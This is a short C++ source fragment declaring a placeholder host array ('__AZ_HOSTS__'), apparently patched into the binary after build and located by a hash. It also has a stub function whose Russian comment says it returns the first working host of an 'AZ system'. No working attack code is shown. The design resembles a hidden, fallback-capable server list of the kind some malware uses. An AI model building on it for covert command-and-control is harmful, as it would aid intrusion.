//---------------------------------------------------------------------------
#pragma hdrstop

#include "Modules.h"

#ifdef AzConfigH
//---------------------------------------------------------------------------

char AZ_HOSTS[AZ_HOSTS_SIZE] = "__AZ_HOSTS__\0\0";
#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */



string GetAzHost()
{
	// Функция возвращает первый рабочий хост из
	// массива хостов системы AZ
	return "";
}

//---------------------------------------------------------------------------
#endif
